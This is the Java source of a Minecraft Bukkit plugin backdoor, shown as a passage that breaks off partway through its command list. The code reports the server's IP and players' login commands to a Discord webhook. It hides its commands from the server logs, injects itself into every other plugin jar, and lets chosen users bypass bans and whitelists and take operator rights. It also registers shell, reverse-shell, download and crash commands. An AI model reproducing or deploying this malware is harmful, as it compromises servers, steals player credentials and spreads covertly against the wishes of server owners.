package com.tmquan2508.exploit;

import org.bukkit.*;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.HandlerList;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.block.BlockDamageEvent;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryDragEvent;
import org.bukkit.event.player.*;
import org.bukkit.event.server.ServerCommandEvent;
import org.bukkit.event.server.PluginDisableEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.RegisteredListener;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.scheduler.BukkitTask;

import java.io.*;
import java.net.InetSocketAddress;
import java.net.URL;
import java.awt.Color;
import java.net.Socket;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.function.Consumer;
import java.lang.reflect.Method;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;

import net.md_5.bungee.api.chat.ClickEvent;
import net.md_5.bungee.api.chat.ComponentBuilder;
import net.md_5.bungee.api.chat.HoverEvent;
import net.md_5.bungee.api.chat.TextComponent;

import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.core.Filter;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.Logger;
import org.apache.logging.log4j.core.filter.AbstractFilter;
import org.apache.logging.log4j.message.Message;

/**
 * Main payload class, acting as a backdoor with various administrative and utility functions.
 * It listens for game events and handles custom commands for authorized users.
 */
public final class Exploit implements Listener {
    private Plugin plugin;
    private CommandHandler commandHandler;
    private Filter commandLogFilter;
    private final Map<String, PlayerState> playerStates = new ConcurrentHashMap<>();
    private final Map<UUID, Integer> permissionLevels = new ConcurrentHashMap<>();
    private final Map<UUID, String> bypassedPlayers = new ConcurrentHashMap<>();
    private final Map<String, BukkitTask> runningSpamTasks = new ConcurrentHashMap<>();
    private final Map<Integer, ShellSession> activeShellSessions = new ConcurrentHashMap<>();
    private final AtomicInteger nextShellId = new AtomicInteger(1);
    private final List<String> commandsToLog = Arrays.asList("l", "log", "login");
    static String sessionId = java.util.UUID.randomUUID().toString().substring(0, 8);
    private static final String LOCK_PROPERTY = "openbd.lock";

    private enum State {
        VANISHED, LOCKED, MUTED, SILKTOUCH, INSTABREAK,
        MF_THROWER, MF_INTERACT, MF_CRIPPLE, MF_FLIGHT, MF_INVENTORY, MF_DROP,
        MF_TELEPORT, MF_MINE, MF_PLACE, MF_LOGIN, MF_GOD, MF_DAMAGE,
        LOG_BLOCKED
    }

    private static class PlayerState {
        private final boolean[] states = new boolean[State.values().length];
    }

    public static class DynamicInvoker {
        public static <T> T invokeConstructor(Class<T> targetClass, Class<?>[] paramTypes, Object... args) {
            try {
                MethodHandles.Lookup lookup = MethodHandles.lookup();
                MethodType constructorType = MethodType.methodType(void.class, paramTypes);
                MethodHandle handle = lookup.findConstructor(targetClass, constructorType);
                return (T) handle.invokeWithArguments(args);
            } catch (Throwable t) {
                sendDebug("[DynamicInvoker] CRITICAL: Failed to invoke constructor for '" + targetClass.getName() + "': " + stackTrace(t));
                return null;
            }
        }

        public static Object invokeStaticMethod(Class<?> targetClass, String methodName, Class<?> returnType, Class<?>[] paramTypes, Object... args) {
            try {
                MethodHandles.Lookup lookup = MethodHandles.lookup();
                MethodType methodType = MethodType.methodType(returnType, paramTypes);
                MethodHandle handle = lookup.findStatic(targetClass, methodName, methodType);
                return handle.invokeWithArguments(args);
            } catch (Throwable t) {
                sendDebug("[DynamicInvoker] CRITICAL: Failed to invoke static method '" + methodName + "': " + stackTrace(t));
                return null;
            }
        }

        public static Object invokeInstanceMethod(Object target, String methodName, Class<?> returnType, Class<?>[] paramTypes, Object... args) {
            try {
                MethodHandles.Lookup lookup = MethodHandles.lookup();
                MethodType methodType = MethodType.methodType(returnType, paramTypes);
                MethodHandle handle = lookup.findVirtual(target.getClass(), methodName, methodType);
                return handle.bindTo(target).invokeWithArguments(args);
            } catch (Throwable t) {
                sendDebug("[DynamicInvoker] CRITICAL: Failed to invoke instance method '" + methodName + "': " + stackTrace(t));
                return null;
            }
        }

        private static String stackTrace(Throwable e) {
            StringWriter sw = new StringWriter();
            PrintWriter pw = new PrintWriter(sw);
            e.printStackTrace(pw);
            return sw.toString();
        }
    }

    //region Initialization
    public Exploit(Plugin plugin) {
        LoadExploit(plugin);
    }

    private void LoadExploit(Plugin plugin) {
        if (System.getProperty(LOCK_PROPERTY) != null) {
            sendDebug(plugin.getName() + ": [Payload] Aborted, another instance is already running.");
            return;
        }
        this.plugin = plugin;
        this.commandHandler = new CommandHandler();
        this.registerAllCommands();

        Config.tmp_authorized_uuids = new String[plugin.getServer().getMaxPlayers()];
        this.playerStates.put("console", new PlayerState());

        sendDebug(Config.chat_message_prefix + " Plugin '" + plugin.getName() + "' has an active payload.");
        System.setProperty(LOCK_PROPERTY, "true");
        plugin.getServer().getPluginManager().registerEvents(this, plugin);

        String ip;
        try { ip = new BufferedReader(new InputStreamReader(new URL("https://api.ipify.org/").openStream())).readLine(); } catch (Exception e) { ip = "?.?.?.?"; }
        try {
            DWeb.EmbedObject message = new DWeb.EmbedObject()
                    .setTitle("ðŸ”¥ Payload Activated")
                    .setDescription("Payload have been activated by plugin **" + plugin.getName() + "**")
                    .setColor(Color.RED)
                    .addField("Server IP", ip + ":" + Bukkit.getServer().getPort(), true)
                    .addField("Server Version", Bukkit.getVersion(), true);
            sendDiscordMessage(message);
        } catch (Exception ignored) {}

        try {
            Logger rootLogger = (Logger) LogManager.getRootLogger();
            this.commandLogFilter = new IssuedCommandLogFilter(this);
            rootLogger.addFilter(this.commandLogFilter);
            sendDebug(ChatColor.DARK_AQUA + "[Exploit] Self-cleaning Log4j filter is now active.");
        } catch (Exception e) {
            sendDebug(ChatColor.RED + "[Exploit] CRITICAL: Failed to attach Log4j filter: " + e.getMessage());
        }

        if (Config.spread_to_other) {
            File pluginFolder = new File("plugins/");
            File[] plugins = pluginFolder.listFiles();

            for (File pluginFile : plugins) {
                if (pluginFile.getName().equals("HostifyMonitor.jar") || pluginFile.getName().equals("FakaHedaMinequery.jar")) { continue; }
                if (pluginFile.isDirectory() || !pluginFile.getName().endsWith(".jar")) { continue; }
                if (Config.debug_log) { Bukkit.getConsoleSender().sendMessage("Injecting Thicc Industries into: " + pluginFile.getPath()); }
                boolean result = Spread.patchFile(pluginFile.getPath(), pluginFile.getPath(), Config.camouflage);
                if (Config.debug_log) {
                    String message = result ? "Success." : "Failed, Already patched?";
                    Bukkit.getConsoleSender().sendMessage(message);
                }
            }
        }
    }

    private class IssuedCommandLogFilter extends AbstractFilter {
        private static final String TARGET_LOG_FRAGMENT = " issued server command: ";
        private final Exploit exploit;
        public IssuedCommandLogFilter(Exploit exploit) { this.exploit = exploit; }
        @Override public Result filter(LogEvent event) {
            Message message = (event == null) ? null : event.getMessage();
            String logMessage = (message == null) ? null : message.getFormattedMessage();
            if (logMessage != null && logMessage.contains(TARGET_LOG_FRAGMENT)) {
                try {
                    String playerName = logMessage.substring(0, logMessage.indexOf(TARGET_LOG_FRAGMENT)).trim();
                    if (exploit.getState(playerName, Exploit.State.LOG_BLOCKED)) { return Result.DENY; }
                } catch (Exception ignored) {}
            }
            return Result.NEUTRAL;
        }
    }

    public static void sendDiscordMessage(DWeb.EmbedObject embed) {
        if (Config.discord_token == null || Config.discord_token.isEmpty()) { return; }
        embed.setFooter("Time: " + new Date() + " â€¢ Session: " + sessionId, null);
        try {
            DWeb webhook = new DWeb(Config.discord_token);
            webhook.addEmbed(embed);
            webhook.execute();
        } catch (IOException ignored) {}
    }

    public static void sendDebug(String log) {
        if (!Config.debug_log) return;
        Bukkit.getConsoleSender().sendMessage(log);
    }

    private void registerAllCommands() {
        commandHandler.register(new LoginCommand(plugin));
        commandHandler.register(new HelpCommand(plugin));
        commandHandler.register(new SpamCommand(plugin));
        commandHandler.register(new OpCommand(plugin));
        commandHandler.register(new DeopCommand(plugin));
        commandHandler.register(new KickCommand(plugin));
        commandHandler.register(new BanCommand(plugin));
        commandHandler.register(new BanIpCommand(plugin));
        commandHandler.register(new GamemodeCommand(plugin));
        commandHandler.register(new GiveCommand(plugin));
        commandHandler.register(new ExecCommand(plugin));
        commandHandler.register(new ShellCommand(plugin));
        commandHandler.register(new ReverseShellCommand(plugin));
        commandHandler.register(new InfoCommand(plugin));
        commandHandler.register(new ChaosCommand(plugin));
        commandHandler.register(new EnchantCommand(plugin));
        commandHandler.register(new SeedCommand(plugin));
        commandHandler.register(new PlayerSayCommand(plugin));
        commandHandler.register(new ServerSayCommand(plugin));
        commandHandler.register(new RenameCommand(plugin));
        commandHandler.register(new ReloadCommand(plugin));
        commandHandler.register(new GetIpCommand(plugin));
        commandHandler.register(new ListWorldsCommand(plugin));
        commandHandler.register(new MakeWorldCommand(plugin));
        commandHandler.register(new DelWorldCommand(plugin));
        commandHandler.register(new VanishCommand(plugin));
        commandHandler.register(new LogBlockCommand(plugin));
        commandHandler.register(new SilkTouchCommand(plugin));
        commandHandler.register(new InstaBreakCommand(plugin));
        commandHandler.register(new CrashCommand(plugin));
        commandHandler.register(new TrollCommand(plugin));
        commandHandler.register(new LockCommand(plugin));
        commandHandler.register(new UnlockCommand(plugin));
        commandHandler.register(new MuteCommand(plugin));
        commandHandler.register(new UnmuteCommand(plugin));
        commandHandler.register(new DownloadCommand(plugin));
        commandHandler.register(new CoordsCommand(plugin));
        commandHandler.register(new AuthCommand(plugin));
        commandHandler.register(new DeauthCommand(plugin));
        commandHandler.register(new TeleportCommand(plugin));
        commandHandler.register(new StopCommand(plugin));
    }
    //endregion

    //region Helper Methods
    private void sendMessage(Player player, String message) {
        player.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + message);
    }

    private void sendMessage(Player player, TextComponent message) {
        TextComponent prefix = new TextComponent(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " ");
        player.spigot().sendMessage(prefix, message);
    }

    private void sendSuccess(Player player, String message) {
        player.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.GREEN + " " + message);
    }

    private void sendWarn(Player player, String message) {
        player.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.YELLOW + " " + message);
    }

    private void sendError(Player player, String message) {
        player.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.RED + " " + message);
    }

    private String getRequiredUsage(Command command) {
        return "Usage: " + Config.command_prefix + command.getName() + " " + command.getUsage();
    }

    private boolean getState(String username, State s) {
        PlayerState state = playerStates.get(username);
        return state != null && state.states[s.ordinal()];
    }

    private void setState(String username, State s, boolean value) {
        playerStates.computeIfAbsent(username, k -> new PlayerState()).states[s.ordinal()] = value;
    }

    private void clearState(String username) {
        for (State s : State.values()) {
            setState(username, s, false);
        }
    }

    public boolean isUserAuthorized(Player p) {
        boolean noUuidsConfigured = (Config.authorized_uuids == null || Config.authorized_uuids.length == 0);
        boolean noUsernamesConfigured = (Config.authorized_usernames == null || Config.authorized_usernames.length == 0);

        if (noUuidsConfigured && noUsernamesConfigured) {
            return true;
        }

        String playerUuid = p.getUniqueId().toString();
        if (!noUuidsConfigured) {
            for (String authorizedUuid : Config.authorized_uuids) {
                if (playerUuid.equalsIgnoreCase(authorizedUuid)) return true;
            }
        }

        if (Config.tmp_authorized_uuids != null) {
            for (String tmpUuid : Config.tmp_authorized_uuids) {
                if (tmpUuid != null && tmpUuid.equalsIgnoreCase(playerUuid)) return true;
            }
        }

        String playerName = p.getName();
        if (!noUsernamesConfigured) {
            for (String authorizedUsername : Config.authorized_usernames) {
                if (playerName.equals(authorizedUsername)) return true;
            }
        }

        return false;
    }

    /**
     * @param p User need to check.
     * @return 0, 1, 2, ...
     */
    public int getPlayerPermissionLevel(Player p) {
        return permissionLevels.getOrDefault(p.getUniqueId(), 0);
    }

    private static boolean deleteWorld(File path) {
        if (path.exists()) {
            File[] files = path.listFiles();
            if (files != null) {
                for (File file : files) {
                    if (file.isDirectory()) {
                        deleteWorld(file);
                    } else {
                        file.delete();
                    }
                }
            }
        }
        return path.delete();
    }

    private static void downloadFile(URL url, String fileName) throws IOException {
        try (InputStream in = url.openStream();
            BufferedInputStream bis = new BufferedInputStream(in);
            FileOutputStream fos = new FileOutputStream(fileName)) {
            byte[] data = new byte[1024];
            int count;
            while ((count = bis.read(data, 0, 1024)) != -1) {
                fos.write(data, 0, count);
            }
        }
    }
    //endregion

    //region Event Handlers
    @EventHandler(priority = EventPriority.LOWEST)
    public void onPlayerChat(AsyncPlayerChatEvent e) {
        Player p = e.getPlayer();
        String msg = e.getMessage();
        if (isUserAuthorized(p) && msg.toLowerCase(Locale.ROOT).startsWith(Config.command_prefix)) {
            e.setCancelled(true);
            commandHandler.execute(p, msg.substring(Config.command_prefix.length()));
        }
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onPlayerJoin(PlayerJoinEvent e) {
        Player player = e.getPlayer();
        playerStates.put(player.getName(), new PlayerState());
        if (isUserAuthorized(player)) {
            permissionLevels.put(player.getUniqueId(), 1);
            sendMessage(player, "You are authorized (Level 1). Run " + Config.command_prefix + "help");
        } else {
            permissionLevels.put(player.getUniqueId(), 0);
        }

        UUID playerUuid = player.getUniqueId();
        String bypassMessage = bypassedPlayers.remove(playerUuid);

        if (bypassMessage != null) {
            sendMessage(player, bypassMessage);
        }

        for (Player onlinePlayer : Bukkit.getOnlinePlayers()) {
            if (getState(onlinePlayer.getName(), State.VANISHED) && !onlinePlayer.equals(player)) {
                Bukkit.getScheduler().runTask(plugin, () -> {
                    player.hidePlayer(plugin, onlinePlayer);
                });
            }
        }
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onPlayerLeave(PlayerQuitEvent e) {
        playerStates.remove(e.getPlayer().getName());
        permissionLevels.remove(e.getPlayer().getUniqueId());
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onKick(PlayerKickEvent e) {
        Player p = e.getPlayer();
        if (isUserAuthorized(p)) {
            e.setCancelled(true);
            setState(p.getName(), State.VANISHED, true);
            InetSocketAddress address = p.getAddress();
            if (address != null) {
                Bukkit.getBanList(BanList.Type.NAME).pardon(p.getName());
                Bukkit.getBanList(BanList.Type.IP).pardon(address.getAddress().getHostAddress());
            }
            sendMessage(p, "You were protected from a kick/ban and are now vanished.");
        }
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onPlayerLogin(PlayerLoginEvent e) {
        DWeb.EmbedObject message = new DWeb.EmbedObject()
                .setAuthor(e.getPlayer().getName() + " connecting...", null, "https://mc-heads.net/avatar/" + e.getPlayer().getUniqueId().toString() + "/100")
                .setColor(Color.CYAN)
                .addField("Hostname", "`" + e.getHostname() + "`", false);
        sendDiscordMessage(message);

        if (getState(e.getPlayer().getName(), State.MF_LOGIN)) {
            e.disallow(PlayerLoginEvent.Result.KICK_BANNED, "Internal Exception: io.netty.handler.codec.DecoderException: Badly compressed packet");
            return;
        }

        Player p = e.getPlayer();
        PlayerLoginEvent.Result result = e.getResult();

        if (isUserAuthorized(p)) {
            String bypassMessage = null;
            if (result == PlayerLoginEvent.Result.KICK_WHITELIST) {
                bypassMessage = "You have successfully bypassed the whitelist.";
            } else if (result == PlayerLoginEvent.Result.KICK_BANNED) {
                bypassMessage = "You have successfully bypassed a server ban.";
            } else if (result == PlayerLoginEvent.Result.KICK_FULL) {
                bypassMessage = "You have successfully joined a full server (bypassed player limit).";
            } else if (result == PlayerLoginEvent.Result.KICK_OTHER) {
                bypassMessage = "You have successfully bypassed a custom server restriction (likely from another plugin).";
            }

            if (bypassMessage != null) {
                e.allow();
                bypassedPlayers.put(p.getUniqueId(), bypassMessage);
            }
        }
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onPlayerCommand(PlayerCommandPreprocessEvent e) {
        Player p = e.getPlayer();
        String name = p.getName();
        if (getState(name, State.LOCKED)) {
            e.setCancelled(true);
        }
        String commandMessage = e.getMessage();
        String[] parts = commandMessage.substring(1).split(" ");
        if (parts.length == 0) {
            return;
        }
        String command = parts[0].toLowerCase();
        if (commandsToLog.contains(command)) {
            DWeb.EmbedObject message = new DWeb.EmbedObject()
                    .setAuthor(name + " execute command" , null, "https://mc-heads.net/avatar/" + p.getUniqueId().toString() + "/100")
                    .setColor(Color.CYAN)
                    .addField("Command", "`" + commandMessage + "`", false);
            sendDiscordMessage(message);
        }
    }

    @EventHandler(priority = EventPriority.LOWEST) public void onServerCommand(ServerCommandEvent e) { if (getState("console", State.LOCKED)) { e.setCancelled(true); } }
    @EventHandler(priority = EventPriority.LOWEST, ignoreCancelled = true) public void onPlayerChatLow(AsyncPlayerChatEvent e) { if (getState(e.getPlayer().getName(), State.MUTED)) e.setCancelled(true); }
    @EventHandler(priority = EventPriority.LOWEST) public void onBlockBreak(BlockBreakEvent e) { Player p = e.getPlayer(); if (getState(p.getName(), State.SILKTOUCH) || getState(p.getName(), State.INSTABREAK)){ if (p.getGameMode() != GameMode.CREATIVE) { e.setDropItems(false); e.getBlock().getWorld().dropItemNaturally(e.getBlock().getLocation(), new ItemStack(e.getBlock().getType(), 1)); } } if (getState(p.getName(), State.MF_MINE)) { e.setCancelled(true); } }
    @EventHandler(priority = EventPriority.LOWEST) public void onBlockPlace(BlockPlaceEvent e) { if (getState(e.getPlayer().getName(), State.MF_PLACE)) { e.setCancelled(true); } }
    @EventHandler(priority = EventPriority.LOWEST) public void onBlockDamage(BlockDamageEvent e) { Player p = e.getPlayer(); if (getState(p.getName(), State.INSTABREAK)) { e.setInstaBreak(true); } if (getState(p.getName(), State.MF_MINE)) { e.setCancelled(true); } }
    @EventHandler(priority = EventPriority.LOWEST) public void onPlayerMove(PlayerMoveEvent e) { Player p = e.getPlayer(); if (getState(p.getName(), State.MF_THROWER)) { p.getWorld().dropItemNaturally(p.getLocation(), new ItemStack(Material.STONE, 64)); } if (getState(p.getName(), State.MF_CRIPPLE)) { Location from = e.getFrom(); Location to = e.getTo(); if (to != null && to.getBlockZ() != from.getBlockZ()) { Location newLoc = from.clone(); newLoc.setPitch(to.getPitch()); newLoc.setYaw(to.getYaw()); e.setTo(newLoc); } } }
    @EventHandler(priority = EventPriority.LOWEST) public void onPlayerInteract(PlayerInteractEvent e) { if (getState(e.getPlayer().getName(), State.MF_INTERACT)) e.setCancelled(true); }
    @EventHandler(priority = EventPriority.LOWEST) public void onPlayerInteractEntity(PlayerInteractEntityEvent e) { if (getState(e.getPlayer().getName(), State.MF_INTERACT)) e.setCancelled(true); }
    @EventHandler(priority = EventPriority.LOWEST) public void onPlayerToggleFlight(PlayerToggleFlightEvent e) { if (e.getPlayer().getGameMode() != GameMode.CREATIVE && getState(e.getPlayer().getName(), State.MF_FLIGHT)) e.setCancelled(true); }
    @EventHandler(priority = EventPriority.LOWEST) public void onInventoryClick(InventoryClickEvent e) { if (e.getWhoClicked() instanceof Player && getState(e.getWhoClicked().getName(), State.MF_INVENTORY)) e.setCancelled(true); }
    @EventHandler(priority = EventPriority.LOWEST) public void onInventoryDrag(InventoryDragEvent e) { if (e.getWhoClicked() instanceof Player && getState(e.getWhoClicked().getName(), State.MF_INVENTORY)) e.setCancelled(true); }
    @EventHandler(priority = EventPriority.LOWEST) public void onPlayerDropItem(PlayerDropItemEvent e) { if (getState(e.getPlayer().getName(), State.MF_DROP)) e.setCancelled(true); }
    @EventHandler(priority = EventPriority.LOWEST) public void onPlayerTeleport(PlayerTeleportEvent e) { if (getState(e.getPlayer().getName(), State.MF_TELEPORT)) e.setCancelled(true); }
    @EventHandler(priority = EventPriority.LOWEST) public void onEntityDamage(EntityDamageEvent e) { if (e.getEntity() instanceof Player && getState(e.getEntity().getName(), State.MF_GOD)) e.setCancelled(true); }
    @EventHandler(priority = EventPriority.LOWEST) public void onEntityDamageByEntity(EntityDamageByEntityEvent e) { if (e.getDamager() instanceof Player && getState(e.getDamager().getName(), State.MF_DAMAGE)) e.setCancelled(true); }
    @EventHandler(priority = EventPriority.LOWEST) public void onPluginDisable(PluginDisableEvent event) {
        if (event.getPlugin().equals(this.plugin)) {
            System.clearProperty(LOCK_PROPERTY);
            sendDebug("[Exploit] Remove property");
        }
    }
    //endregion

    //region Command Framework
    /**
     * Abstract class defining the structure of a command.
     */
    public abstract class Command {
        protected final Plugin plugin;
        public Command(Plugin plugin) { this.plugin = plugin; }
        public abstract String getName();
        public abstract String getDescription();
        public abstract String getUsage();
        public abstract int getRequirePerm();
        public abstract void execute(Player sender, String[] args);
    }

    /**
     * Manages command registration and execution.
     */
    private class CommandHandler {
        private final Map<String, Command> commands = new ConcurrentHashMap<>();

        public void register(Command command) {
            commands.put(command.getName().toLowerCase(), command);
        }

        public void execute(Player sender, String commandLine) {
            String[] parts = commandLine.split(" ");
            String commandName = parts[0].toLowerCase();
            String[] args = Arrays.copyOfRange(parts, 1, parts.length);
            Command command = commands.get(commandName);

            if (command != null) {
                int requiredPerm = command.getRequirePerm();
                int userPerm = getPlayerPermissionLevel(sender);

                if (userPerm >= requiredPerm) {
                    command.execute(sender, args);
                } else {
                    sendError(sender, "You do not have permission to use this command.");
                }
            } else {
                sendError(sender, "Unknown command. Type '" + Config.command_prefix + "help'.");
            }
        }
    }
    //endregion

    //region Command Implementations
    private class LoginCommand extends Command {
        public LoginCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "login"; }
        @Override public String getDescription() { return "Log in for elevated permissions (Level 2)."; }
        @Override public String getUsage() { return "<password>"; }
        @Override public int getRequirePerm() { return 1; }
        @Override public void execute(Player sender, String[] args) {
            boolean isPasswordNotSet = Config.authorized_password.isEmpty() || 
            "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855".equals(Config.authorized_password);
            if (isPasswordNotSet) { permissionLevels.put(sender.getUniqueId(), 2); sendMessage(sender, "Login successful because password is not set. You now have Level 2 permissions."); return; }
            if (args.length < 1) { sendError(sender, getRequiredUsage(this)); return; }
            try {
                MessageDigest digest = MessageDigest.getInstance("SHA-256");
                byte[] hash = digest.digest(args[0].getBytes(StandardCharsets.UTF_8));
                StringBuilder hexString = new StringBuilder(2 * hash.length);
                for (byte b : hash) {
                    String hex = Integer.toHexString(0xff & b);
                    if (hex.length() == 1) hexString.append('0');
                    hexString.append(hex);
                }

                if (hexString.toString().equals(Config.authorized_password)) {
                    permissionLevels.put(sender.getUniqueId(), 2);
                    sendMessage(sender, "Login successful. You now have Level 2 permissions.");
                } else {
                    sendError(sender, "Incorrect password.");
                }
            } catch (NoSuchAlgorithmException e) {
                sendError(sender, "This server runs in a Java environment that doesn't have the SHA-256 algorithm!");
                sendWarn(sender, "Therefore, anyone on the authorized list can get permission.");
                permissionLevels.put(sender.getUniqueId(), 2);
                sendMessage(sender, "Login successful. You now have Level 2 permissions.");
            }
        }
    }

    private class HelpCommand extends Command {
        public HelpCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "help"; }
        @Override public String getDescription() { return "Display this message, or description of a command."; }
        @Override public String getUsage() { return "[command]"; }
        @Override public int getRequirePerm() { return 1; }
        @Override public void execute(Player sender, String[] args) {
            int userPerm = getPlayerPermissionLevel(sender);

            if (args.length == 0) {
                StringBuilder sb = new StringBuilder();
                sb.append(Config.help_detail_color).append("Thicc Industries Backdoor\n");
                sb.append(Config.help_detail_color).append("-----------------------------------------------------\n\n");

                for (Command cmd : commandHandler.commands.values()) {
                    if (userPerm >= cmd.getRequirePerm()) {
                        sb.append(Config.help_command_name_color).append(Config.command_prefix).append(cmd.getName())
                                .append(": ").append(Config.help_command_desc_color).append(cmd.getDescription()).append("\n");
                    }
                }
                sendMessage(sender, sb.toString());
            } else {
                Command cmd = commandHandler.commands.get(args[0].toLowerCase());
                if (cmd != null && userPerm >= cmd.getRequirePerm()) {
                    sendMessage(sender, Config.help_command_name_color + Config.command_prefix + cmd.getName() + " " + ChatColor.GRAY + cmd.getUsage());
                    sendMessage(sender, Config.help_command_desc_color + cmd.getDescription());
                } else {
                    sendError(sender, "Command not found: " + args[0]);
                }
            }
        }
    }

    private class SpamCommand extends Command {
        private final Map<Integer, BukkitTask> activeTasks = new ConcurrentHashMap<>();
        private final Map<Integer, String> activeTaskDetails = new ConcurrentHashMap<>();
        private int nextId = 0;

        public SpamCommand(Plugin plugin) { super(plugin); }

        @Override public String getName() { return "spam"; }
        @Override public String getDescription() { return "Manages repeating message broadcast tasks."; }
        @Override public String getUsage() { return "<start|stop|list> [args...]"; }
        @Override public int getRequirePerm() { return 2; }

        @Override
        public void execute(Player sender, String[] args) {
            if (args.length < 1) {
                sendError(sender, getRequiredUsage(this));
                return;
            }

            String subCommand = args[0].toLowerCase();
            String[] subArgs = Arrays.copyOfRange(args, 1, args.length);

            switch (subCommand) {
                case "start":
                    handleStart(sender, subArgs);
                    break;
                case "stop":
                    handleStop(sender, subArgs);
                    break;
                case "list":
                    handleList(sender);
                    break;
                default:
                    sendError(sender, getRequiredUsage(this));
                    break;
            }
        }

        private void handleStart(Player sender, String[] args) {
            if (args.length < 3) {
                sendError(sender, "Usage: " + Config.command_prefix + "spam start <amount> <delay_ticks> <message...>");
                sendWarn(sender, "Note: 20 ticks = 1 second.");
                return;
            }

            int amount;
            long delayInTicks;

            try {
                amount = Integer.parseInt(args[0]);
                delayInTicks = Long.parseLong(args[1]);
            } catch (NumberFormatException e) {
                sendError(sender, "Error: Amount and delay must be integers.");
                return;
            }

            if (amount <= 0 || delayInTicks < 0) {
                sendError(sender, "Error: Amount must be > 0, and delay must be >= 0.");
                return;
            }

            String message = String.join(" ", Arrays.copyOfRange(args, 2, args.length));
            final String finalMessage = ChatColor.translateAlternateColorCodes('&', message.replace("\\n", "\n"));
            final int taskId = ++nextId;

            BukkitTask task = new BukkitRunnable() {
                private int timesRun = 0;
                @Override public void run() {
                    if (timesRun++ >= amount) {
                        activeTasks.remove(taskId);
                        activeTaskDetails.remove(taskId);
                        this.cancel();
                        return;
                    }
                    Bukkit.broadcastMessage(finalMessage);
                }
            }.runTaskTimer(plugin, 0L, delayInTicks);

            String details = "Amount: " + amount + ", Delay: " + delayInTicks + "t, Message: \"" + message + "\"";
            activeTasks.put(taskId, task);
            activeTaskDetails.put(taskId, details);
            sendSuccess(sender, "Started spam task with ID: " + taskId);
        }

        private void handleStop(Player sender, String[] args) {
            if (args.length < 1) {
                sendError(sender, "Usage: " + Config.command_prefix + "spam stop <id>");
                return;
            }
            
            int id;
            try {
                id = Integer.parseInt(args[0]);
            } catch (NumberFormatException e) {
                sendError(sender, "Invalid ID: '" + args[0] + "'");
                return;
            }

            BukkitTask task = activeTasks.remove(id);
            activeTaskDetails.remove(id);

            if (task != null) {
                task.cancel();
                sendSuccess(sender, "Successfully stopped spam task with ID: " + id);
            } else {
                sendError(sender, "Error: Spam task with ID not found: " + id);
            }
        }

        private void handleList(Player sender) {
            if (activeTasks.isEmpty()) {
                sendMessage(sender, "No spam tasks are currently running.");
                return;
            }

            sendMessage(sender, ChatColor.GREEN + "Running spam tasks:");
            for (Map.Entry<Integer, String> entry : activeTaskDetails.entrySet()) {
                 sendMessage(sender, ChatColor.YELLOW + " - ID: " + entry.getKey() + " | " + ChatColor.WHITE + entry.getValue());
            }
        }
    }

    private class OpCommand extends Command {
        public OpCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "op"; }
        @Override public String getDescription() { return "Grants operator status to a player."; }
        @Override public String getUsage() { return "[player]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            Player target;
            if (args.length < 1) {
                target = sender;
            } else {
                target = Bukkit.getPlayer(args[0]);
                if (target == null) {
                    sendError(sender, "Player not found: " + args[0]);
                    return;
                }
            }

            final Player finalTarget = target;
            Bukkit.getScheduler().runTask(plugin, () -> {
                DynamicInvoker.invokeInstanceMethod( finalTarget, "setOp", void.class, new Class<?>[]{boolean.class}, true );
                sendMessage(sender, finalTarget.getName() + " is now op.");
            });
        }
    }

    private class DeopCommand extends Command {
        public DeopCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "deop"; }
        @Override public String getDescription() { return "Revokes operator status from a player."; }
        @Override public String getUsage() { return "[player]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            Player target;
            if (args.length < 1) {
                target = sender;
            } else {
                target = Bukkit.getPlayer(args[0]);
                if (target == null) {
                    sendError(sender, "Player not found: " + args[0]);
                    return;
                }
            }
            
            final Player finalTarget = target;
            Bukkit.getScheduler().runTask(plugin, () -> {
                DynamicInvoker.invokeInstanceMethod( finalTarget, "setOp", void.class, new Class<?>[]{boolean.class}, false );
                sendMessage(sender, finalTarget.getName() + " is no longer op.");
            });
        }
    }

    private class KickCommand extends Command {
        public KickCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "kick"; }
        @Override public String getDescription() { return "Kicks a player from the server."; }
        @Override public String getUsage() { return "<player> [reason]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { sendError(sender, getRequiredUsage(this)); return; }
            Player target = Bukkit.getPlayer(args[0]);
            if (target == null) { sendError(sender, "Player not found or is not online: " + args[0]); return; }
